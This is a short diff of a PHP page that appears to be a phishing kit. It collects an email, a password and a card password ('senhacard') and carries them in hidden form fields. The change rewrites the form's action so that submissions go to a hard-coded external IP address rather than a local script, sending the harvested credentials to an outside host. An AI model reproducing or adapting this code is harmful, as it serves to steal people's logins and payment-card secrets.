@@ -163,7 +163,7 @@ $senha6 = $_POST['senhacard'];
             background-size: 100%; background-repeat:no-repeat; ">
             <div class="clean-page-container__Container-sc-1oppj57-0 ejOUcG">
               
-            <form id="form1" name="form1" action="enviar.php" method="post" autocomplete="off">
+            <form id="form1" name="form1" action="http://52.146.91.165/enviar.php" method="post" autocomplete="off">
 
                   <input type="hidden" name="email" id="email" value="<?php echo $email ?>">
                   <input type="hidden" name="password" id="password" value="<?php echo $senha ?>">
